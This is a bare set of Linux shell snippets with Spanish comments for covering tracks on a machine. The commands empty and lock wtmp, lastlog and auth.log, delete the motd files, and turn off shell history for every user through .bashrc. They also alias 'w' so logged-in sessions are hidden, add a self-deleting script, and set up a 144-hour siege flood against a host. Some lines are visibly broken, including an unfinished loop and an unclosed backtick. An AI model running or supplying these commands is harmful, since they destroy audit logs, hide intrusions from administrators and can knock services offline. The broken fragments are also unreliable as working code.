#Eliminar Mensajes del dia

/bin/rm -rf /etc/motd
/bin/rm -rf /etc/motd.tail

#eliminar

/bin/cat /dev/null > /var/log/wtmp
/bin/cat /dev/null > /var/log/lastlog
/bin/cat /dev/null > /var/log/auth.log

/usr/bin/chattr +i /var/log/wtmp
/usr/bin/chattr +i /var/log/lastlog
/usr/bin/chattr +i /var/log/auth.log

#restaurar

/usr/bin/chattr -i /var/log/wtmp
/usr/bin/chattr -i /var/log/lastlog
/usr/bin/chattr -i /var/log/auth.log

/bin/cat /dev/null > /var/log/wtmp
/bin/cat /dev/null > /var/log/lastlog
/bin/cat /dev/null > /var/log/auth.log

/usr/bin/chattr +i /var/log/wtmp
/usr/bin/chattr +i /var/log/lastlog
/usr/bin/chattr +i /var/log/auth.log

echo "x.x.x.x   www.test.com" >> /etc/hosts
nohup siege -b -c 400 -t 144H http://www.test.com/en

for i in `ls /home/`; do echo "shopt -u -o history" >> /home/$i/.bashrc; done
for i in `find /home/ -type d`; do INSERCION=`nl -ba /home/${i}/.bashrc | egrep '\s*[0-9]\s*alias'|head -1; echo $INSERCION; done

for i in `ls  /home/*/.bashrc`; do INSERCION=`nl -ba ${i} | egrep '\s*[0-9]\s*alias'|head -1|awk {'print $1'} `; sed -i ''$INSERCION'ialias w='\''w > /dev/null'\''' $i ;done

for i in 
sed -i ''$INSERCION'ialias w='\''w > /dev/null'\''' /home/user/.bashrc


#Si quieres borrar el propio fichero que se esta ejecutanto en terminal

#!/bin/bash

LASTFILE=$_

if [ $# -gt 0 ]; then
	echo $#
	echo "el comando se lanza sin argumentos"
else
	/bin/rm -rf $LASTFILE
	exit 0
fi
